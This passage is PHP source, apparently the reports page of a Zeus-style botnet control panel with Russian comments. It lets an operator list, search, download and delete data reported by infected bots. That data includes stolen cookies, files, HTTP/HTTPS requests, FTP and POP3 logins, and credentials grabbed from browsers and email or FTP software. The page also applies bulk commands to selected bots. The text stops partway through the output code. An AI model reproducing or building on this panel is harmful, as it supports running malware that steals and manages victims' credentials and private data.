<?php if(!defined('__CP__'))die();
define('REPORT_PREVIEW_MAX_CHARS', 100); //Максимальное количество символов в предпросмотре context и path_source.

$_allow_remove = !empty($userData['r_reports_db_edit']);
$rlist = listReportTables($config['mysql_db']); //Получение списка таблиц botnet_reports_*.

///////////////////////////////////////////////////////////////////////////////////////////////////
// Вывод отдельного лога.
///////////////////////////////////////////////////////////////////////////////////////////////////

if(isset($_GET['t']) && isset($_GET['id']))
{
  //Ищим таблицу.
  $tbl = 0;
  foreach($rlist as $t)if(intval(substr($t, -6)) == $_GET['t']){$tbl = $t; break;}
  if($tbl === 0)ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);

  //Загрузка файла.
  if(isset($_GET['download']))
  {
    $r = mysqlQueryEx($tbl, "SELECT context, LENGTH(context), path_dest FROM {$tbl} WHERE {$tbl}.id='".addslashes($_GET['id'])."' LIMIT 1");  
    if(!$r)ThemeMySQLError();
    if(@mysql_affected_rows() != 1 || !($m = @mysql_fetch_row($r)))ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);

    if(($file = baseNameEx($m[2])) == '')$file = 'file';
    
    httpDownloadHeaders($file, $m[1]);
    echo $m[0];
    die();
  }
  
  //Получаем базовую информацию.   //0            //1            //2                 //3                //4                 //5                 //6                    //7
  $r = mysqlQueryEx($tbl,
                    "SELECT {$tbl}.bot_id, {$tbl}.botnet, {$tbl}.bot_version, {$tbl}.os_version, {$tbl}.language_id, {$tbl}.time_system, {$tbl}.time_localbias, {$tbl}.time_tick, ".
                            //8           //9             //10         //11                 //12                 //13                //14                //15             //16                   //17                  //18
                    "{$tbl}.rtime, {$tbl}.country, {$tbl}.ipv4, {$tbl}.process_name, {$tbl}.process_user, {$tbl}.path_source, {$tbl}.type, LENGTH({$tbl}.context), {$tbl}.path_dest, botnet_list.comment, botnet_list.flag_used ".
                    "FROM {$tbl} LEFT JOIN botnet_list ON botnet_list.bot_id={$tbl}.bot_id WHERE {$tbl}.id='".addslashes($_GET['id'])."' LIMIT 1");  
  
  if(!$r)ThemeMySQLError();
  if(@mysql_affected_rows() != 1 || !($m = @mysql_fetch_row($r)))ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);

  //URL для под запросов к отчету.
  $sub_url = QUERY_STRING_HTML.'&amp;t='.htmlEntitiesEx(urlencode($_GET['t'])).'&amp;id='.htmlEntitiesEx(urlencode($_GET['id']));
  
  //Проверяем тип отчета.
  $context = '';
  if($m[14] == BLT_FILE || $m[14] == BLT_UNKNOWN)
  {
    if(($file = baseNameEx($m[16])) == '')$file = 'file';

    $context = str_replace(array('{URL}', '{TEXT}'), array($sub_url.'&amp;download=1', sprintf(LNG_REPORTS_VIEW_DOWNLOAD, htmlEntitiesEx($file), numberFormatAsInt($m[15]))), THEME_LIST_ANCHOR);
    
    $context =
    str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   THEME_STRING_SPACE), THEME_LIST_ITEM_LTEXT_U2).
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $context),           THEME_LIST_ITEM_LTEXT_U2);
  }
  else
  {
    $r = mysqlQueryEx($tbl, "SELECT context FROM {$tbl} WHERE {$tbl}.id='".addslashes($_GET['id'])."' LIMIT 1");    
    if(!$r)ThemeMySQLError();
    if(@mysql_affected_rows() != 1 || !($cc = @mysql_fetch_row($r)))ThemeFatalError(LNG_REPORTS_VIEW_NOT_EXISTS);
    
    $context = str_replace(array('{COLUMNS_COUNT}', '{WIDTH}', '{TEXT}'), array(2, '100%', htmlEntitiesEx($cc[0])), THEME_LIST_ITEM_PLAIN_U1);
  }
  
  //Вывод.
  $data =
  str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, sprintf(LNG_REPORTS_VIEW_TITLE2, bltToLng($m[14]), numberFormatAsInt($m[15]))), THEME_LIST_TITLE).
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_BOTID),                                THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', botPopupMenu($m[0], 'botmenu')),                        THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_BOTNET),                               THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($m[1])),                                THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_VERSION),                              THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', intToVersion($m[2])),                                   THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_OS),                                   THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', osDataToString($m[3])),                                 THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_OSLANG),                               THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($m[4])),                                THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_TIME),                                 THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx(gmdate(LNG_FORMAT_DT, $m[5] + $m[6]))), THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_TIMEBIAS),                             THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', timeBiasToText($m[6])),                                 THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_TICK),                                 THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', tickCountToText($m[7] / 1000)),                         THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_RTIME),                                THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx(gmdate(LNG_FORMAT_DT, $m[8]))),         THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_COUNTRY),                              THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($m[9])),                                THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.         
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_IPV4),                                 THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($m[10])),                               THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_COMMENT),                              THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($m[17]) ? '-' : htmlEntitiesEx($m[17])),         THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_USED),                                 THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $m[18] == 1 ? LNG_YES : LNG_NO),                        THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_PROCNAME),                             THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($m[11]) ? '-' : htmlEntitiesEx($m[11])),         THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_PROCUSER),                             THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($m[12]) ? '-' : htmlEntitiesEx($m[12])),         THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_REPORTS_VIEW_SOURCE),                               THEME_LIST_ITEM_LTEXT_U2).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($m[13]) ? '-' : htmlEntitiesEx($m[13])),         THEME_LIST_ITEM_LTEXT_U2).
    THEME_LIST_ROW_END.
    THEME_LIST_ROW_BEGIN.
      $context.
    THEME_LIST_ROW_END;
  
  themeSmall(LNG_REPORTS_VIEW_TITLE, $data.THEME_LIST_END, 0, getBotJsMenu('botmenu'), 0);
  
  die();
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Определяем данные для фильтра.
///////////////////////////////////////////////////////////////////////////////////////////////////

//При добавлении новых параметров нужно уничтожать не нужные для js:datelist.

$filter['date1']     = isset($_GET['date1']) ? intval($_GET['date1']) : 0;
$filter['date2']     = isset($_GET['date2']) ? intval($_GET['date2']) : 0;
if($filter['date1'] > $filter['date2']){$t = $filter['date1']; $filter['date1'] = $filter['date2']; $filter['date2'] = $t;}

$filter['date']      = isset($_GET['date'])  ? intval($_GET['date']) : 0;

$filter['bots']      = isset($_GET['bots'])      ? $_GET['bots']      : '';
$filter['botnets']   = isset($_GET['botnets'])   ? $_GET['botnets']   : '';
$filter['ips']       = isset($_GET['ips'])       ? $_GET['ips']       : '';
$filter['countries'] = isset($_GET['countries']) ? $_GET['countries'] : '';

$filter['q']         = isset($_GET['q'])   ? $_GET['q']           : '';
$filter['blt']       = isset($_GET['blt']) ? intval($_GET['blt']) : BLT_UNKNOWN; 

$filter['cs']        = empty($_GET['cs'])       ? 0 : 1;
$filter['grouping']  = empty($_GET['grouping']) ? 0 : 1;
$filter['nonames']   = empty($_GET['nonames'])  ? 0 : 1;
$filter['plain']     = empty($_GET['plain'])    ? 0 : 1;

$filter['rm']        = ($_allow_remove && isset($_GET['rm']) && intval($_GET['rm']) === 1) ? 1 : 0;

///////////////////////////////////////////////////////////////////////////////////////////////////
// Определяем тип вывода страницы.
///////////////////////////////////////////////////////////////////////////////////////////////////

$_is_ajax_result  = isset($_GET['q']) && $filter['date1'] > 0 && $filter['date2'] > 0;                                //Страница выводиться как результат поиска ajax.
$_is_ajax_search  = !$_is_ajax_result && $filter['date'] > 0 && isset($_GET['q']);                                     //Страница выводиться как рельутат поиска ajax.
$_is_plain_search = ($_is_ajax_result && $filter['plain'] == 1 && $filter['rm'] == 0 && $filter['blt'] != BLT_FILE); //Cтраница должна открыться как plain-поиск.
if($_is_plain_search)$_is_ajax_result = false;

///////////////////////////////////////////////////////////////////////////////////////////////////
// Создание запроса.
///////////////////////////////////////////////////////////////////////////////////////////////////

if($_is_ajax_search || $_is_plain_search)
{
  $q1 = array();
  
  if($filter['blt'] != BLT_UNKNOWN)
  {
    if($filter['blt'] == -1)$q1[] = "(type='".BLT_HTTP_REQUEST."' OR type='".BLT_HTTPS_REQUEST."')";
    else if($filter['blt'] == -2)$q1[] = "(type='".BLT_GRABBED_UI."' OR type='".BLT_GRABBED_HTTP."' OR type='".BLT_GRABBED_WSOCKET."' OR type='".BLT_GRABBED_FTPSOFTWARE."' OR type='".BLT_GRABBED_EMAILSOFTWARE."' OR type='".LNG_BLT_GRABBED_OTHER."')";
    else $q1[] = "type='".addslashes($filter['blt'])."'";
  }
  
  if($_is_plain_search)$q1[] = 'type!=\''.BLT_FILE.'\''; //Нельзя искать файлы при текстовом выводе.

  $q1[] = expressionToSql($filter['countries'], '`country`', 0, 1);
  $q1[] = expressionToSql($filter['ips'],       '`ipv4`',    1, 1);
  $q1[] = expressionToSql($filter['botnets'],   '`botnet`',  0, 1);
  $q1[] = expressionToSql($filter['bots'],      '`bot_id`',  0, 1);
  
  {
    $tt = expressionToSql($filter['q'], 'path_source', $filter['cs'], 0);
    if(!empty($tt))
    {
      $tt .= ' OR '.expressionToSql($filter['q'], 'path_dest', $filter['cs'], 0);
      $tt .= ' OR '.expressionToSql($filter['q'], 'context', $filter['cs'], 0);
      $q1[] = '('.$tt.')';
    }
  }

  //Чистим массив.
  foreach($q1 as $k => $v)if($v == '')unset($q1[$k]);

  $query1 = count($q1) > 0 ? ' WHERE '.implode(' AND ', $q1) : '';
  
  $query2 = '';
  if($filter['grouping'])$query2 .= ' GROUP BY context';
  $query2 .= ' ORDER BY bot_id, rtime';

  unset($q1);
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// HTML фильтр/результат.
///////////////////////////////////////////////////////////////////////////////////////////////////

if(!$_is_ajax_search && !$_is_plain_search)
{
  define('INPUT_WIDTH',  '200px'); //Ширина input.text.
  define('INPUTQ_WIDTH', '500px'); //Ширина input.text.

  $js_qw     = addJsSlashes(LNG_REPORTS_FILTER_REMOVE_Q);
  $js_script = jsCheckAll('botslist', 'checkall', 'bots[]');
  $js_script .= 
<<<JS_SCRIPT
function RemoveReports()
{
  if(confirm('{$js_qw}'))
  {
    var f = document.forms.namedItem('filter');
    f.elements.namedItem('rm').value = 1;
    f.submit();
  }
}
JS_SCRIPT;

  //Подготовливаем список дат.
  if($_is_ajax_result)
  {
    $datelist = '';
    $js_datelist = '';
    
    foreach($rlist as $t)
    {
      $v = intval(substr($t, -6));
      if($v >= $filter['date1'] && $v <= $filter['date2'])
      {
        $datelist .=
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, htmlEntitiesEx(gmdate(LNG_FORMAT_DATE, gmmktime(0, 0, 0, substr($t, -4, 2), substr($t, -2, 2), substr($t, -6, 2) + 2000)))), THEME_DIALOG_TITLE).
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace('{ID}', 'dt'.htmlEntitiesEx($v), THEME_STRING_ID_BEGIN).
              THEME_IMG_WAIT.
            THEME_STRING_ID_END.
            THEME_STRING_NEWLINE.
            THEME_STRING_NEWLINE.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END;
        
        $js_datelist .= ($js_datelist == '' ? '' : ', ')."['dt".addJsSlashes($v)."', '".addJsSlashes(urlencode($v))."']";
      }
    }
    
    $f = $filter;
    unset($f['date1']);
    unset($f['date2']);
    unset($f['date']);
    unset($f['plain']);
    
    $q = addJsSlashes(QUERY_STRING);
    foreach($f as $k => $v)$q .= '&'.addJsSlashes(urlencode($k)).'='.addJsSlashes(urlencode($v));
    
    $ajax_init  = jsXmlHttpRequest('datehttp');
    $ajax_err   = addJsSlashes(str_replace('{TEXT}', LNG_REPORTS_DATE_ERROR, THEME_STRING_ERROR));
    $js_script .=    
<<<JS_SCRIPT

var datelist = [{$js_datelist}];
var datehttp = false;

function stateChange(i){if(datehttp.readyState == 4)
{
  var el = document.getElementById(datelist[i][0]);
  if(datehttp.status == 200 && datehttp.responseText.length > 1)el.innerHTML = datehttp.responseText;
  else el.innerHTML = '{$ajax_err}';
  SearchDate(++i);
}}

function SearchDate(i)
{
  if(datehttp)delete sockshttp;
  if(i < datelist.length)
  {
    {$ajax_init}
    if(datehttp)
    {
      datehttp.onreadystatechange = function(){stateChange(i)};
      datehttp.open('GET', '{$q}&date=' + datelist[i][1], true);
      datehttp.send(null);
    }
  }
}
JS_SCRIPT;
  }

  ThemeBegin(LNG_REPORTS, $js_script, getBotJsMenu('botmenu'), $_is_ajax_result ? ' onload="SearchDate(0);"' : 0);
  //Фильтр.
  echo str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('filter', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_BEGIN);
  if($_allow_remove)echo str_replace(array('{NAME}', '{VALUE}'), array('rm', 0), THEME_FORM_VALUE);
  echo
    FORM_CURRENT_MODULE.
    str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_REPORTS_FILTER_TITLE), THEME_DIALOG_TITLE).
    
      //Даты.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
          LNG_REPORTS_FILTER_DATE_P1.THEME_STRING_SPACE.
          str_replace(array('{NAME}', '{WIDTH}'), array('date1', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
            MakeDateList('date1', $rlist).
          THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_STRING_SPACE.LNG_REPORTS_FILTER_DATE_P2.THEME_STRING_SPACE.
          str_replace(array('{NAME}', '{WIDTH}'), array('date2', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
            MakeDateList('date2', $rlist).
          THEME_DIALOG_ITEM_LISTBOX_END.
          THEME_STRING_SPACE.LNG_REPORTS_FILTER_DATE_P3.
        THEME_DIALOG_ITEM_CHILD_END.
      THEME_DIALOG_ROW_END.
    
      //Стандартный фильтр.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_BOTS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'bots',      htmlEntitiesEx($filter['bots']),      512), THEME_DIALOG_ITEM_INPUT_TEXT).
            THEME_DIALOG_ITEM_MAXSPACE.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_BOTNETS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'botnets',   htmlEntitiesEx($filter['botnets']),   512), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_IPS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'ips',       htmlEntitiesEx($filter['ips']),       512), THEME_DIALOG_ITEM_INPUT_TEXT).
            THEME_DIALOG_ITEM_MAXSPACE.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_COUNTRIES, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'countries', htmlEntitiesEx($filter['countries']), 512), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    
      //Строка поиска.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_QUERY, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUTQ_WIDTH, 'q', htmlEntitiesEx($filter['q']), 4096), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_REPORTTYPE, THEME_DIALOG_ITEM_TEXT).
            str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
              str_replace(array('{NAME}', '{WIDTH}'), array('blt', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_UNKNOWN,               LNG_REPORTS_FILTER_ALL),        $filter['blt'] == BLT_UNKNOWN               ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_COOKIES,              LNG_BLT_COOKIES),                $filter['blt'] == BLT_COOKIES               ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_FILE,                  LNG_BLT_FILE),                  $filter['blt'] == BLT_FILE                  ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(-1,                        LNG_BLT_HTTPX_REQUEST),         $filter['blt'] == -1                        ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_HTTP_REQUEST,          LNG_BLT_HTTP_REQUEST),          $filter['blt'] == BLT_HTTP_REQUEST          ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_HTTPS_REQUEST,         LNG_BLT_HTTPS_REQUEST),         $filter['blt'] == BLT_HTTPS_REQUEST         ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_LOGIN_FTP,             LNG_BLT_LOGIN_FTP),             $filter['blt'] == BLT_LOGIN_FTP             ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_LOGIN_POP3,            LNG_BLT_LOGIN_POP3),            $filter['blt'] == BLT_LOGIN_POP3            ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(-2,                        LNG_BLT_GRABBED_X),             $filter['blt'] == -2                        ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_UI,            LNG_BLT_GRABBED_UI),            $filter['blt'] == BLT_GRABBED_UI            ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_HTTP,          LNG_BLT_GRABBED_HTTP),          $filter['blt'] == BLT_GRABBED_HTTP          ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_WSOCKET,       LNG_BLT_GRABBED_WSOCKET),       $filter['blt'] == BLT_GRABBED_WSOCKET       ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_FTPSOFTWARE,   LNG_BLT_GRABBED_FTPSOFTWARE),   $filter['blt'] == BLT_GRABBED_FTPSOFTWARE   ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_EMAILSOFTWARE, LNG_BLT_GRABBED_EMAILSOFTWARE), $filter['blt'] == BLT_GRABBED_EMAILSOFTWARE ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
                str_replace(array('{VALUE}', '{TEXT}'), array(BLT_GRABBED_OTHER,         LNG_BLT_GRABBED_OTHER),         $filter['blt'] == BLT_GRABBED_OTHER         ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              THEME_DIALOG_ITEM_LISTBOX_END.
            THEME_DIALOG_ITEM_CHILD_END.
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
                        array(2, 'cs', 1, LNG_REPORTS_FILTER_CS, ''),
                        $filter['cs'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
                       ).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
                        array(2, 'grouping', 1, LNG_REPORTS_FILTER_GROUPQUERY, ''),
                        $filter['grouping'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
                       ).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
                        array(2, 'nonames', 1, LNG_REPORTS_FILTER_NONAMES, ''),
                        $filter['nonames'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
                       ).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'),
                        array(2, 'plain', 1, LNG_REPORTS_FILTER_PLAIN, ''),
                        $filter['plain'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2
                       ).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    
      //Управление.
      str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
        str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_RESET, ''), THEME_DIALOG_ITEM_ACTION_RESET).
        THEME_STRING_SPACE.
        str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_SUBMIT, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
        ($_allow_remove ? THEME_STRING_SPACE.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_REMOVE, ' onclick="RemoveReports()"'), THEME_DIALOG_ITEM_ACTION) : '').
      THEME_DIALOG_ACTIONLIST_END.
    THEME_DIALOG_END.
  THEME_FORMGET_END;

  //Вывод результата.
  if($_is_ajax_result)
  {
    //Создание списока дейcтвий.    
    $al = '';
    if($filter['rm'] !== 1 && $filter['nonames'] !== 1 && count($botMenu) > 0)
    {
      $al = str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('checkall', 1, ' onclick="checkAll()"'), THEME_DIALOG_ITEM_INPUT_CHECKBOX_3).THEME_STRING_SPACE.
            LNG_REPORTS_BOTSACTION.THEME_STRING_SPACE.str_replace(array('{NAME}', '{WIDTH}'), array('botsaction', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN);
      foreach($botMenu as $item)$al .= str_replace(array('{VALUE}', '{TEXT}'), array($item[0], $item[1]), THEME_DIALOG_ITEM_LISTBOX_ITEM);
      $al .= THEME_DIALOG_ITEM_LISTBOX_END.THEME_STRING_SPACE.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_ACTION_APPLY, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).THEME_STRING_NEWLINE.THEME_STRING_NEWLINE;
      $al = THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END;
    }

    //Результат.
    echo
    THEME_VSPACE.
    str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('botslist', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_TO_NEW_BEGIN).
      str_replace('{WIDTH}', '80%', THEME_DIALOG_BEGIN).
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS_RESULT), THEME_DIALOG_TITLE).
        $al.
        $datelist.
